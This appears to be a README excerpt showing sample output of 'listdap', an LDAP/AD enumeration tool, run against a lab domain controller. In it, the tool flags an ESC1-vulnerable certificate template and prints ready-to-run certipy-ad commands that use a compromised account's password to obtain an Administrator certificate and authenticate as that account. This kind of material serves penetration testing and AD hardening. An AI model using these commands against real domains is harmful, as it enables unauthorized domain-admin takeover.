# Example output

Running the **ADCS** module authenticated as the compromised `svc_ca` account against a lab DC. listdap flags **ESC1** on `Welcome-Template` (enrollable by the current identity) and prints a ready-to-run exploitation command filled from the enumerated data.

```ansi

  ██╗     ██╗███████╗████████╗██████╗  █████╗ ██████╗ 
  ██║     ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗
  ██║     ██║███████╗   ██║   ██║  ██║███████║██████╔╝
  ██║     ██║╚════██║   ██║   ██║  ██║██╔══██║██╔═══╝ 
  ███████╗██║███████║   ██║   ██████╔╝██║  ██║██║     
  ╚══════╝╚═╝╚══════╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝     

[96m[*][0m Connecting to 10.10.10.10:636 (LDAPS)

[92m[1m  ✔ Connected[0m
    [96mTarget:[0m  10.10.10.10:636
    [96mAuth:[0m  [92mKerberos (GSSAPI)[0m
    [96mBase DN:[0m  DC=corp,DC=local

[94m[1m╔════════════════════════════════════════════════════════════╗[0m
[94m[1m║                ADCS — CERTIFICATE SERVICES                 ║[0m
[94m[1m╚════════════════════════════════════════════════════════════╝[0m
[92m[+][0m 1 Certificate Authority(ies) found
[96m[*][0m [1mCertificate Templates[0m: [97m[1m34[0m total

[96m[1m  ── CA: CORP-CA ──[0m
    [96mHostname:[0m  DC01.corp.local
    [96mPublished templates:[0m  12
[92m[+][0m ESC7: no non-privileged CA management rights on CORP-CA (via RRP)

[96m[1m  ── ESC1 — Enrollee Supplies Subject + Client Auth EKU ──[0m
    [93m[1mWelcome-Template[0m
      [96m    EKUs:[0m  1.3.6.1.5.5.7.3.1, 1.3.6.1.5.5.7.3.2
      [96m    Enrollable by:[0m  corp.local\svc_ca
      [96m    Exploit:[0m  
        [92mcertipy-ad req -u 'svc_ca@corp.local' -p 'P@ssw0rd!' -dc-ip 10.10.10.10 -ca 'CORP-CA' -template 'Welcome-Template' -upn 'Administrator@corp.local'[0m
        [92mcertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10[0m

[96m[1m  ── ESC1 (config) — not enrollable by current identity ──[0m
    [2mSubordinate Certification Authority[0m
      [96m    Enrollment rights:[0m  Domain Admins, Enterprise Admins
[96m[*][0m Above templates match ESC1 config but the current identity cannot enroll — exploitable only after gaining one of the listed identities, or via ESC4 if you can edit the template ACL.

[94m[1m╔════════════════════════════════════════════════════════════╗[0m
[94m[1m║                         QUICK WINS                         ║[0m
[94m[1m╚════════════════════════════════════════════════════════════╝[0m
  [91m[1m[CRITICAL][0m [1mESC1 — 1 vulnerable template(s)[0m
         [2mAllows requesting a certificate with an arbitrary SAN (e.g., Domain Admin UPN).[0m
         [2mEnrollable by a principal the current identity controls:[0m
         [2m  - Welcome-Template  (enrollable by: corp.local\svc_ca)[0m
         [2m      certipy-ad req -u 'svc_ca@corp.local' -p 'P@ssw0rd!' -dc-ip 10.10.10.10 -ca 'CORP-CA' -template 'Welcome-Template' -upn 'Administrator@corp.local'[0m
         [2m      certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10[0m
```
